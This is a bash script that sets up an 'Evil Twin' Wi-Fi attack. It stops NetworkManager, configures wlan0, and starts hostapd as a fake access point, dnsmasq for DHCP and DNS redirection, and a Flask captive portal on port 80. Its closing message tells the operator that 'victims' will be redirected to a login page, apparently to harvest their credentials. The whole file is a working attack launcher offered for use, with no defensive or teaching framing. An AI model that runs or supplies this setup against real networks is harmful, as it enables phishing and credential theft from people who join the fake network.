#!/bin/bash

# === Color Settings ===
GREEN="\033[0;32m"
RED="\033[0;31m"
YELLOW="\033[1;33m"
RESET="\033[0m"

# Set path to evil-twin-attack folder
ET_DIR="./evil-twin-attack"

echo -e "${GREEN}[+] Starting Evil Twin Attack Setup...${RESET}"

# 1. Stop potential conflicting services
echo -e "${GREEN}[+] Stopping NetworkManager and existing dnsmasq/hostapd services...${RESET}"
sudo systemctl stop NetworkManager
sudo pkill dnsmasq
sudo pkill hostapd
sudo pkill python3

# 2. Configure IP address for wlan0
echo -e "${GREEN}[+] Setting wlan0 IP to 192.168.1.1...${RESET}"
sudo ip link set wlan0 down
sudo ip addr flush dev wlan0
sudo ip link set wlan0 up
sudo ifconfig wlan0 192.168.1.1 netmask 255.255.255.0

# 3. Start hostapd (Fake Wi-Fi Access Point)
echo -e "${GREEN}[+] Starting Fake Wi-Fi with hostapd...${RESET}"
sudo hostapd "$ET_DIR/hostapd.conf" > "$ET_DIR/hostapd.log" 2>&1 &
sleep 2

if pgrep -f "hostapd" > /dev/null; then
    echo -e "${GREEN}[✓] hostapd is running successfully${RESET}"
else
    echo -e "${RED}[✗] hostapd failed! Check log at: $ET_DIR/hostapd.log${RESET}"
fi

# 4. Start dnsmasq (DHCP & DNS redirect)
echo -e "${GREEN}[+] Starting dnsmasq for DHCP and DNS redirection...${RESET}"
sudo dnsmasq -d -C "$ET_DIR/dnsmasq.conf" > "$ET_DIR/dnsmasq.log" 2>&1 &
sleep 2

if pgrep -f "dnsmasq" > /dev/null; then
    echo -e "${GREEN}[✓] dnsmasq is running successfully${RESET}"
else
    echo -e "${RED}[✗] dnsmasq failed! Check log at: $ET_DIR/dnsmasq.log${RESET}"
fi

# 5. Start Flask Web Server (Captive Portal)
echo -e "${GREEN}[+] Starting Flask Captive Portal on port 80...${RESET}"
cd "$ET_DIR"
sudo python3 app.py > flask.log 2>&1 &
sleep 2

if pgrep -f "app.py" > /dev/null; then
    echo -e "${GREEN}[✓] Flask Web Server is running successfully${RESET}"
else
    echo -e "${RED}[✗] Flask Web Server failed! Check log at: $ET_DIR/flask.log${RESET}"
fi
cd ..

# Final message
echo -e "${YELLOW}==========================================${RESET}"
echo -e "${GREEN}[✓] Evil Twin system is now running!${RESET}"
echo -e "${GREEN}=> Victims should connect to the fake Wi-Fi and will be redirected to the login page.${RESET}"
echo -e "${YELLOW}==========================================${RESET}"
